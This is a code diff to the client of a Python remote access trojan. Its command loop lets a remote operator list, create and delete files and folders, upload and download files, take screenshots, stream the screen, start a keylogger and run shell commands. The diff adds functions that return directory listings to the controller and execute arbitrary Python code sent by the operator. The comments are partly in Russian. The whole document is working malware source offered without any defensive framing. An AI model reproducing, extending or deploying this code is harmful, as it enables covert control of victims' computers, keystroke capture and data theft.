@@ -139,6 +139,16 @@ def show_stream():
         data = pickle.dumps(np.array(img))
         s.sendall(struct.pack("L", len(data)) + data)
 
+def send_dir():
+    dirs = []
+    files = []
+    for element in os.listdir():
+        if os.path.isdir(element):
+            dirs.append(element)
+        else:
+            files.append(element)
+    reliable_send(json.dumps([dirs,files]))
+
 def shell():
     while True:
         command = reliable_recv()
@@ -155,22 +165,23 @@ def shell():
             pass
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
-            reliable_send(",".join(os.listdir()))
+            send_dir()
+            #reliable_send(",".join(os.listdir()))
         elif command[:2] == 'ls':
-            reliable_send(",".join(os.listdir()))
+            send_dir()
         elif command[:12] == 'create_file ':
             f = open(command[12:], 'w+')
             f.close()
-            reliable_send(",".join(os.listdir()))
+            send_dir()
         elif command[:12] == 'delete_file ':
             os.remove(command[12:])
-            reliable_send(",".join(os.listdir()))
+            send_dir()
         elif command[:14] == 'create_folder ':
             os.mkdir(command[14:])
-            reliable_send(",".join(os.listdir()))
+            send_dir()
         elif command[:14] == 'delete_folder ':
             os.rmdir(command[14:])
-            reliable_send(",".join(os.listdir()))
+            send_dir()
         elif command[:7] == 'upload ':
             download_file(command[7:])
         elif command[:9] == 'download ':
@@ -181,6 +192,12 @@ def shell():
             os.remove('screen.png')
         elif command[:13] == 'screen_stream':
             show_stream()
+        elif command[:12] == 'python_exec ':
+            result = exec(str(command[12:]))
+            reliable_send('Success')
+        elif command[:17] == 'python_exec_file ':
+            result = execfile(str(command[17:]))
+            reliable_send('Success execute file')
         elif command[:12] == 'keylog_start':
             keylog = keylogger.KeyLogger()
             t = threading.Thread(target=keylog.start)
@@ -209,14 +226,10 @@ def shell():
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
-                print('Вхожу в alarm')
-                result = execute.stdout.read() + execute.stderr.read()
-                print('Вышел из alarm успешно' + result)
-                result = result.decode()
-                print('Ok, recive' + result)
-                reliable_send(result)
-                #reliable_recv()
-                #print('try 5')
+                # Не работает на python 3
+                # result = execute.stdout.read() + execute.stderr.read()
+                out, err = execute.communicate()
+                reliable_send('Done<br>result: ' + out.decode() + '<br>errors: ' + err.decode())
             except:
                 print('shell except')
                 reliable_send('Ой-ой, команда (' + command + ') не была распознана shell')
